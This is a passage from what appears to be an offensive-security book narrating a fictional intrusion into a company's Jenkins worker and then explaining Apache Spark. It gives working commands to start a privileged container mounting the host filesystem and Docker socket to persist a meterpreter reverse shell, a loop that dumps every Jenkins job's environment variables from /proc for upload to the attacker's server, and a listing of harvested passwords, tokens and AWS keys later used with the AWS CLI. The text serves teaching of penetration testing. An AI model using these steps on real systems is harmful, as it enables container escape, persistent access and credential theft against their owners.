
Container Registry (ECR). We know the account ID 983457354409; we saw it authorized in the bucket policy of mxrads-dl. Our hunch was right: it was Gretsch Politico after all.

All the containers found in Listing 12-2 were lifted using a master tag, except for one: the app-abtest image, which bears the curious tag SUP6541-add-feature-network.

We might have an idea about what’s going on in this machine, but we still need one last piece of information before making a conclusion. Let’s get more information using the docker info command to display data about the host:

```
# docker info
Name: jenkins-slave-4
Total Memory: 31.859GiB
Operating System: Ubuntu 16.04.6 LTS
Server:
Containers: 546
Running: 12
--snip--
```

Hello, Jenkins, our old friend. Now it all makes sense. We can guess that our payload is triggered by what we can assume are end-to-end test workloads. The job that triggered in this instance probably starts a container that authenticates to AWS ECR using the ecr-login.sh script and then lifts a subset of production containers, indicated by the master tag—datavalley, libpredict, and the rest—along with the experimental Docker image of the service to be tested: ab-test. That explains why it has a different tag than all the other containers.

Exposing the Docker socket in this way is a common practice in test environments, where Docker is not so much used for its isolation properties, but rather for its packaging features. For example, Crane, a popular Docker orchestration tool (https://github.com/michaelsauter/crane/), is used to lift containers along with their dependencies. Instead of installing Crane on every single machine, a company may package it in a container and pull it at runtime whenever needed.

From a software vantage point, it’s great. All jobs are using the same version of the Crane tool, and the server running the tests becomes irrelevant. From a security standpoint, however, this legitimizes the use of Docker-in-Docker tricks (Crane runs containers from within its own container), which opens the floodgates of hell and beyond.

## Persisting the Access

Test jobs can only last so long before being discarded. Let’s transform this ephemeral access into a permanent one by running a custom meterpreter on a new container we’ll label aws-cli:

```
# docker run \
--privileged \
-v /:/hostOS \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /usr/bin/docker:/usr/bin/docker \
-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli
```

Our new reverse shell is running in a privileged container that mounts the Docker socket along with the entire host filesystem in the /hostOS directory:

```
meterpreter > ls /hostOS
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt
opt  proc  root  run...
```

Let the fun begin!
As we saw in Chapter 10, Jenkins can quickly aggregate a considerable amount of privileges due to its scheduling capabilities. It’s the Lehman Brothers of the technological world—a hungry entity in an unregulated realm, encouraged by reckless policymakers and one trade away from collapsing the whole economy.

In this particular occurrence, that metaphorical trade happens to be how Jenkins handles environment variables. When a job is scheduled on a worker, it can be configured either to pull the two or three secrets it needs to run properly or to load every possible secret as environment variables. Let’s find out just how lazy Gretsch Politico’s admins really are.

We single out every process launched by Jenkins jobs on this machine:

```
shell> ps -ed -o user,pid,cmd | grep "jenkins"
jenkins   1012   /lib/systemd/systemd -user
jenkins   1013   sshd: jenkins@notty
jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...
jenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/... 
--snip--
```

We copy the PIDs of these processes into a file and iterate over each line to fetch their environment variables, conveniently stored at the path /proc/$PID/environ:

```
shell> ps -ed -o user,pid,cmd \
| grep "jenkins" \
| awk '{print $2}' \
> listpids.txt
shell> while read p; do \
cat /hostOS/proc/$p/environ >> results.txt; \
done <listpids.txt
```

We upload our harvest to our remote server and apply some minor formatting, and then we enjoy the cleartext results (see Listing 12-3).

```
root@Point1:~/# cat results.txt
ghprbPullId = 1068
SANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox
DBEXP_PROD_USER = pg_sql_exp
DBEXP_PROD_PASS = vDoMue8%12N97
METAMARKET_TOKEN = 1#4Xq3_rwn14gJKmkynOHho8p6peSZ2UGIvs...
DASHBOARD_PROD_PASSWORD = 4hXqulCghprbIU24745
SPARK_MASTER = 10.50.12.67
ActualCommitAuthorEmail = Elain.ghaber@gretschpolitico.com
BINTRAY_API_KEY = 557d459a1e9ac79a1da57$fbee88acdeacsq7S
GITHUB_API = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561
ECR_AWS_ID = AKIA7ZRK7X1QSZR4H2P
ECR_AWS_SECRET = ZO5cOTQQ/5zNoEkRE99pdlInY6anhgz2s30GJ+zgb
--snip--
```

### Listing 12-3: The results from collecting environment variables of jobs running on the Jenkins machine

Marvelous. We scored a GitHub API token to explore GP’s entire codebase, a couple of database passwords to harvest some data, and obviously AWS access keys that should at least have access to ECR (the AWS container registry) or maybe even EC2, if we’re lucky.

We load them on our server and blindly start exploring AWS services:

```
root@Point1:~/# aws ecr describe-repositories \
--region=eu-west-1 \
--profile gretsch1

"repositoryName": "lib-prediction",
"repositoryName": "service-geoloc",
"repositoryName": "cookie-matching",
--snip--

root@Point1:~/# aws ec2 describe-instances --profile gretsch1
An error occurred (UnauthorizedOperation)...

root@Point1:~/# aws s3api list-buckets --profile gretsch1
An error occurred (UnauthorizedOperation)...

root@Point1:~/# aws iam get-user --profile gretsch1
An error occurred (AccessDenied)...
```

We hit multiple errors as soon as we step outside of ECR. In another time, another context, we would fool around with container images, search for hardcoded credentials, or tamper with the production tag to achieve code execution on a machine—but there is another trail that seems more promising. It was buried inside the environment data we dumped in Listing 12-3, so let me zoom in on it again:

```
SPARK_MASTER = 10.50.12.67
```

The SPARK here indicates Apache Spark, an open source analytics engine. It might seem surprising to let the ECR access keys and database credentials slide by just to focus on this lonely IP address, but remember one of our original goals: getting user profiles and data segments. This type of data will not be stored in your average 100GB database. When fully enriched with all the available information about each person, and given the size of MXR Ads’ platform, these data profiles could easily reach hundreds if not thousands of terabytes.

Two problems commonly arise when companies are dealing with such ridiculous volumes. Where do they store the raw data? And how can they process it efficiently?

Storing raw data is easy. S3 is cheap and reliable, so that’s a no-brainer. Processing gigantic amounts of data, however, is a real challenge. Data scientists looking to model and predict behavior at a reasonable cost need a distributed system to handle the load—say, 500 machines working in parallel, each training multiple models with random hyperparameters until they find the formulas with the lowest error rate.

But that raises additional problems. How can they partition the data efficiently among the nodes? What if all the machines need the same piece of data? How do they aggregate all the results? And most important of all: how do they deal with failure? Because there sure is going to be failure. For every 1,000 machines, on average 5, if not more, will die for any number of reasons, including disk issues, overheating, power outage, and other hazardous events, even in a top-tier datacenter. How can they redistribute the failed workload on healthier nodes?

It is exactly these questions that Apache Spark aims to solve with its distributed computing framework. If Spark is involved in Gretsch Politico, then it’s most likely being used to process massive amounts of data that could very likely be the user profiles we are after—hence our interest in the IP address we retrieved on the Jenkins machine.

Breaking into the Spark cluster would automatically empower us to access the raw profiling data, learn what kind of processing it goes through, and understand how the data is exploited by Gretsch Politico.

As of this moment, however, there is not a single hacking post to help us shake down a Spark cluster (the same observation can be made about almost every tool involved in big data: Yarn, Flink, Hadoop, Hive, and so on). Not even an Nmap script to fingerprint the damn thing. We are sailing in uncharted waters, so the most natural step is to first understand how to interact with a Spark cluster.

## Understanding Spark

A Spark cluster is essentially composed of three major components: a master server, worker machines, and a driver. The driver is the client looking to perform a calculation; that would be the analyst’s laptop, for instance. The master’s sole job is to manage workers and assign them jobs based on memory and CPU requirements. Workers execute whatever jobs the master sends their way. They communicate with both the master and the driver.

Each of these three components is running a Spark process inside a Java virtual machine (JVM), even the analyst’s laptop (driver). Here is the kicker, though: security is off by default on Spark.
